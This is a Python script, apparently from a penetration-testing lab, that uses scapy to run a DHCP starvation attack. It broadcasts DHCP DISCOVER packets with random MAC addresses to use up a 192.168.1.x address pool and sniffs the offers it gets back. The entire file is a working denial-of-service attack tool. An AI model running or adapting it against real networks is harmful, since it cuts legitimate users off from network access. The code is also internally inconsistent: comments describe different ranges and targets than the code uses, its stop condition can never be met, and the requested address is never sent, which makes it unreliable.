from scapy.all import *
from time import sleep
from threading import Thread

class DHCPStarvation(object):
    
    def __init__(self):
        
        # Generated MAC stored to avoid same MAC requesting for different IP
        self.mac = [""]
        
        # Requested IP stored to identify registered IP
        self.ip = []
        
    def handle_dhcp(self, pkt):
        
        if pkt[DHCP]:
            
            # if DHCP server reply ACK, the IP address requested is registered
            # 10.10.111.107 is IP for bt5, not to be starved
            
            if pkt[DHCP].options[0][1]==2 and pkt[IP].dst != "192.168.1.1":
                
                self.ip.append(pkt[IP].dst)
                print()
                print (str(pkt[IP].dst)+ " Offered")
            
            # Duplicate ACK may happen due to packet loss
            
            elif pkt[DHCP].options[0][1]==6:
                
                print ("NAK received")
    
    def listen(self):
        
        # sniff DHCP packets
        
        sniff(filter="udp and (port 67 or port 68)",
            prn=self.handle_dhcp,
            store=0)
        
    def start(self):
        # start packet listening thread
        thread = Thread(target=self.listen)
        thread.start()
        
        print("Starting DHCP starvation...")
        
        # Keep starving until all 100 targets are registered
        # 100~200 excepts 107 = 100
        
        while len(self.ip) < 21: self.starve()
        print ("Targeted IP address starved")
        

    def starve(self):
        for i in range(20 , 31):
           
            # generate IP we want to request
            # if IP already registered, then skip
           
            requested_addr = "192.168.1."+str(i)
           
            if requested_addr in self.ip:
                continue
            
            # generate MAC, avoid duplication
           
            src_mac = ""
           
            while src_mac in self.mac:
                src_mac = RandMAC()
            
            self.mac.append(src_mac)
            
            #Create DHCP discover with destination IP = broadadcast
            #Source MAC address is a random MAC address
            #Source IP address = 0.0.0.0
            #Destination IP address = broadcast
            #Source port = 68 (DHCP / BOOTP Client)
            #Destination port = 67 (DHCP / BOOTP Server)
            #DHCP message type is discover
            
            DHCP_DISCOVER = Ether(dst='ff:ff:ff:ff:ff:ff', src=RandMAC(), type=0x0800) \
            / IP(src='0.0.0.0', dst='255.255.255.255') \
            / UDP(dport=67,sport=68) \
            / BOOTP(op=1, chaddr=RandMAC()) \
            / DHCP(options=[('message-type','discover'), ('end')])
            #print(type(pkt) , type(RandMAC()) , type(RandString(12, "0123456789abcdef")))
            
            sendp(DHCP_DISCOVER)
            
            print ("Trying to Discover "+requested_addr)
            
            # interval to avoid congestion and packet loss
            sleep(1)  
            

if __name__ == "__main__":
    
    starvation = DHCPStarvation()
    starvation.start()              
